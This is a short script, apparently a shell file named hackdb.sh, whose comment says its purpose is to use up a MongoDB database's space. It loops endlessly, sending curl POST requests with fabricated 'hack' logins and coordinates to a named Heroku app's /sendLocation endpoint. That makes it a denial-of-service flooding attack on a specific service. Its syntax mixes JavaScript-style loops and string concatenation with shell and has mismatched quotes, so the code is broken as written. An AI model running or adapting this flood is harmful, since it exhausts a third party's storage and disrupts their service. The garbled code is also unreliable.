//Shell code to use up mongo database space
while(true)
{
	i++;
	curl --data "login=" + "hack" + i + "&lat=" + i + "&lng=" + i """ http://hidden-refuge-11792.herokuapp.com/sendLocation 
}
//Use ./hackdb.sh on terminal